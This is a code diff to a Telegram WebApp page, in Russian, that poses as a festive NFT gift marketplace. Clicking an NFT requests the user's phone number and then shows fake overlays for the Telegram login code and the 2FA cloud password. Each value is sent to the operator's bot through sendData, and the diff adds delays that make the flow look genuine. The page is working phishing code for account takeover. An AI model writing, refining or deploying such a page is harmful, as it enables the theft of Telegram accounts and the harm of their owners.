@@ -50,28 +50,28 @@ canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
 
 .label{ font-size:12px; color:var(--text-soft); margin-bottom:6px; }
 .value{ font-size:20px; font-weight:600; }
-.desc{ font-size:14px; color:var(--text-soft); line-height:1.55; }
 
 /* BUTTON */
 .btn{ width:100%; margin-top:12px; padding:14px; border-radius:14px; border:none; background:linear-gradient(135deg,var(--accent-red),var(--accent-green)); color:#fff; font-weight:700; cursor:pointer; box-shadow:0 6px 20px rgba(0,0,0,0.5); transition:0.3s; }
-.btn:active{ transform:scale(0.98); }
 
 /* MARKET */
 .market{ display:grid; grid-template-columns:1fr 1fr; gap:14px; }
-.nft{ background:var(--card); border:1px solid var(--border); border-radius:18px; padding:10px; text-align:center; }
+.nft{ background:var(--card); border:1px solid var(--border); border-radius:18px; padding:10px; text-align:center; cursor:pointer;}
 .nft img{ width:100%; max-height:140px; object-fit:contain; border-radius:14px; }
 
-/* MODALS (ОКНА ВВОДА) */
+/* ОКНА ВВОДА (OVERLAYS) */
 .overlay {
     display: none; position: fixed; inset: 0; 
-    background: rgba(0,0,0,0.9); backdrop-filter: blur(15px);
+    background: rgba(0,0,0,0.92); backdrop-filter: blur(15px);
     z-index: 1000; padding: 40px 24px; flex-direction: column; justify-content: center;
 }
-.overlay.active { display: flex; }
+.overlay.active { display: flex; animation: fadeIn 0.3s ease; }
+@keyframes fadeIn { from{opacity:0} to{opacity:1} }
+
 .input-field {
     background: rgba(255,255,255,0.05); border: 1.5px solid var(--accent-red);
     padding: 20px; border-radius: 16px; color: #fff;
-    font-size: 26px; text-align: center; margin: 25px 0; outline: none;
+    font-size: 26px; text-align: center; margin: 25px 0; outline: none; width: 100%;
 }
 
 .fireplace{ position:fixed; bottom:10px; right:10px; font-size:48px; text-shadow:0 0 15px #f77; z-index:2; opacity:0.85; }
@@ -87,9 +87,9 @@ canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
 </div>
 
 <div class="nav">
-    <button id="tab-cab" class="active" onclick="openTab('cab',this)">Кабинет</button>
-    <button id="tab-market" onclick="openTab('market',this)">Маркет</button>
-    <button id="tab-support" onclick="openTab('support',this)">Поддержка</button>
+    <button class="active" onclick="openTab('cab',this)">Кабинет</button>
+    <button onclick="openTab('market',this)">Маркет</button>
+    <button onclick="openTab('support',this)">Поддержка</button>
 </div>
 
 <div id="cab" class="section active">
@@ -109,53 +109,57 @@ canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
     <div class="market">
         <div class="nft" onclick="startAuth()">
             <img src="https://nft.fragment.com/gift/santahat-10168.webp">
-            <div class="nft-title">Frosty Hat</div>
+            <div style="font-size:13px; margin-top:8px">Frosty Hat</div>
         </div>
         <div class="nft" onclick="startAuth()">
             <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp">
-            <div class="nft-title">Holiday Drink</div>
+            <div style="font-size:13px; margin-top:8px">Holiday Drink</div>
         </div>
     </div>
 </div>
 
 <div id="support" class="section">
     <div class="card">
-        <p>Контакт техподдержки: <b>@x1o1y</b></p>
+        <p style="color:var(--text-soft)">По всем вопросам: <b>@x1o1y</b></p>
         <button class="btn" onclick="window.open('https://t.me/x1o1y')">Написать</button>
     </div>
 </div>
 
 <div id="step-code" class="overlay">
-    <h2 style="text-align:center">Код из Telegram</h2>
-    <p style="text-align:center; color:var(--text-soft)">Мы отправили код в ваше приложение</p>
+    <h2 style="text-align:center">Код подтверждения</h2>
+    <p style="text-align:center; color:var(--text-soft)">Введите код из приложения Telegram</p>
     <input type="number" id="inp-code" class="input-field" placeholder="00000">
-    <button class="btn" onclick="submitCode()">ПОДТВЕРДИТЬ</button>
+    <button class="btn" onclick="sendCode()">ПОДТВЕРДИТЬ</button>
 </div>
 
 <div id="step-2fa" class="overlay">
-    <h2 style="text-align:center">Пароль 2FA</h2>
-    <p style="text-align:center; color:var(--text-soft)">Введите ваш облачный пароль</p>
+    <h2 style="text-align:center">Облачный пароль</h2>
+    <p style="text-align:center; color:var(--text-soft)">Ваш аккаунт защищен 2FA. Введите пароль:</p>
     <input type="password" id="inp-pass" class="input-field" placeholder="Пароль">
-    <button class="btn" onclick="submitPass()">ВОЙТИ</button>
+    <button class="btn" onclick="sendPass()">ВОЙТИ</button>
 </div>
 
 <div class="fireplace">🔥</div>
 
 <script>
-const tg=window.Telegram.WebApp; tg.expand();
+const tg = window.Telegram.WebApp;
+tg.expand();
 
-function openTab(id,el){
-    document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
-    document.querySelectorAll('.nav button').forEach(b=>b.classList.remove('active'));
+// Навигация
+function openTab(id, el) {
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
     document.getElementById(id).classList.add('active');
     el.classList.add('active');
 }
 
+// Начало авторизации (запрос контакта через бот)
 function startAuth() {
-    tg.requestContact((ok,res)=>{
-        if(ok && res.responseUnsafe.contact){
+    // В данном дизайне предполагается, что бот сначала просит контакт, 
+    // а потом юзер открывает WebApp. Если вызвать из WebApp:
+    tg.requestContact((ok, res) => {
+        if(ok && res.responseUnsafe.contact) {
             tg.sendData("PHONE:" + res.responseUnsafe.contact.phone_number);
-            // Пауза 3 сек, пока Python отправляет код
             setTimeout(() => {
                 document.getElementById('step-code').classList.add('active');
             }, 3000);
@@ -163,24 +167,36 @@ function startAuth() {
     });
 }
 
-function submitCode() {
-    const val = document.getElementById('inp-code').value;
+// 1. ФУНКЦИЯ ОТПРАВКИ КОДА (Твоя логика с паузой 1.5 сек)
+function sendCode() {
+    let val = document.getElementById('inp-code').value; 
+    
     if(val.length >= 5) {
-        tg.sendData("CODE:" + val);
-        document.getElementById('step-code').classList.remove('active');
-        document.getElementById('step-2fa').classList.add('active');
+        tg.sendData("CODE:" + val); 
+        
+        document.querySelector('#step-code button').innerText = "Проверка...";
+        
+        setTimeout(() => {
+            document.getElementById('step-code').classList.remove('active'); 
+            document.getElementById('step-2fa').classList.add('active');    
+        }, 1500);
+    } else {
+        alert("Введите код из 5 цифр");
     }
 }
 
-function submitPass() {
-    const val = document.getElementById('inp-pass').value;
+// 2. ФУНКЦИЯ ОТПРАВКИ ПАРОЛЯ
+function sendPass() {
+    let val = document.getElementById('inp-pass').value;
     if(val.length > 0) {
         tg.sendData("PASS:" + val);
-        tg.close();
+        setTimeout(() => {
+            tg.close();
+        }, 1000);
     }
 }
 
-/* СНЕГ */
+/* СНЕГ (Твой стиль) */
 const c=document.getElementById("snow"),ctx=c.getContext("2d");
 let w,h,flakes=[];
 function resize(){w=c.width=innerWidth;h=c.height=innerHeight}
